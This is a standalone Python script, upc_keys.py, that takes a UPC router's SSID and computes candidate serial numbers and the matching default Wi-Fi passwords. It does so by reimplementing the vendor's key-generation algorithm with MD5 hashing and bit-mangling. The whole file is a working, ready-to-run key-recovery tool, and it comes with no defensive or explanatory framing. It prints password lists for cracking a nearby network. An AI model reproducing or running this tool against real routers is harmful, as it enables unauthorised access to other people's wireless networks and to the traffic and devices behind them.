#!/bin/python
import hashlib
import sys

PREFIXES = ['SAAP', 'SBAP', 'SAPP']

def predict_serials(ssid):
    ssid = int(ssid[3:13])
    serials = []
    for i in range(5):
        for p0 in range(10):
            base_num = (ssid // 100) + 25000 + i * 50000 - p0 * 25000
            a = base_num // 68
            if a < 0 or a > 999:
                continue
            while True:
                p3 = base_num - a * 68
                if p3 < 0 or p3 > 99:
                    break
                p1 = a // 10
                p2 = a % 10
                p4 = ssid % 100
                serial = p0 * 10000000 + p1 * 100000 + p2 * 10000 + p3 * 100 + p4
                serials.append(serial)
                if a == 0:
                    break
                a -= 1
    return serials

def multi(a, b):
    result = [0,0]
    if a < 32767 and b < 65536:
        result[0] = (a * b)
        result[1] = (-1 if result[0] < 0 else 0)
        return result
    a00 = a & 0xFFFF
    a16 = a >> 16
    b00 = b & 0xFFFF
    b16 = b >> 16
    c00 = a00 * b00
    c16 = (c00 >> 16) + (a16 * b00)
    c32 = c16 >> 16
    c16 = (c16 & 0xFFFF) + (a00 * b16)
    c32 = c32 + (c16 >> 16)
    c48 = c32 >> 16
    c32 = (c32 & 0xFFFF) + (a16 * b16)
    c48 = c48 + (c32 >> 16)
    result[0] = (((c16 & 0xFFFF) << 16) | (c00 & 0xFFFF))
    result[1] = (((c48 & 0xFFFF) << 16) | (c32 & 0xFFFF))
    return result

def mangle(pp):
    a = (((multi(pp[3], 0x68de3af))[1] >> 8) - (pp[3] >> 31)) % 0x100000000
    b = ((pp[3] - a * 9999 + 1) * 11) % 0x100000000
    return (b * (pp[1] * 100 + pp[2] * 10 + pp[0])) % 0x100000000

def hash_to_pass(in_hash):
    result = ''
    for i in range(8):
        a = int(in_hash[i * 2:i * 2 + 2], 16) & 0x1f
        a -= ((multi(a, 0xb21642c9)[1] >> 4) * 23)
        a = (a & 0xff) + 0x41
        a += 1 if a >= 73 else 0 # 'I'
        a += 1 if a >= 76 else 0 # 'L'
        a += 1 if a >= 79 else 0 # 'O'
        result += chr(a)
    return result

def serial_to_pass(serial):
    md5res = hashlib.md5(str(serial).encode()).hexdigest()
    nums = []
    for i in range(8):
        str_part = md5res[i * 4:i * 4 + 4]
        nums.append(int(str_part[2:4] + str_part[0:2], 16))
    w1 = mangle(nums[0:4])
    w2 = mangle(nums[4:8])
    md5inp = (format(w1, '08x') + format(w2, '08x')).upper()
    return hash_to_pass(hashlib.md5(md5inp.encode()).hexdigest())

def predict_passwords(ssid):
    passwords = []
    serials = predict_serials(ssid)
    for prefix in PREFIXES:
        for serial in serials:
            passwords.append([prefix + str(serial).rjust(8, '0'), serial_to_pass(prefix + str(serial).rjust(8, '0'))])
    return passwords

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: upc_keys.py [SSID]\nExample: \033[93mupc_keys.py\033[0m \033[92mUPC1234567\033[0m")
        exit(2)
    for device_data in predict_passwords(sys.argv[1]):
        print(device_data[1]) # device_data is an array with Serial and Password example: ['SAAP19165767', 'CWGUJAJX']